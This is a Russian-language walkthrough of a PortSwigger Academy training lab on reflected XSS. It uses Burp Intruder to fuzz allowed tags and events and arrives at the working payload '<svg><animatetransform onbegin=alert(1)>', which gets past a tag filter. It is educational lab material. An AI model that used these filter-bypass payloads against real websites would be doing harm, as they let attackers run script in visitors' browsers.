введем в строку поиска следующую XSS-ку
```
<img src=1 onerror=alert(1)>
```
и найдем в истории поиска данный запрос

Видим, что получили ответ 
```
"Tag is not allowed"
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/pics%20for%20walktrough/1.png)
отправим данный запрос в интрудер
```
GET /?search=<§§> 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/pics%20for%20walktrough/2.png)
и перейдем в читлист 
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
```
и в качестве пэйлоадов выберем все тэги, которые принимаются веб-сервером
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/pics%20for%20walktrough/3.png)
начнем атаку, и увидим что нам вернулсь 200 статус респонс коды на следующие тэги:
```
title
svg
image
animatetransform
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/pics%20for%20walktrough/4.png)

Выберем тэг `svg` (так как по названию лабы он явно должен быть как-то причастен) и `animatetransform`
изменим запрос в интрудере на
```
GET /?search=<svg><animatetransform%20§§=1>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/pics%20for%20walktrough/5.png)
и в качестве элементов листа возьмем все значения из `events` читлиста
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/pics%20for%20walktrough/6.png)
и запустим атаку
отсортируем по статус коду, и увидим, что единственное что выдало 200 респонс код, это евент 
`onbegin`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/pics%20for%20walktrough/7.png)
соответственно идем в поисковую строку, вводим 
```
<svg><animatetransform onbegin=alert(1)>
```
и получаем сработавшую XSS и уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/pics%20for%20walktrough/8.png)
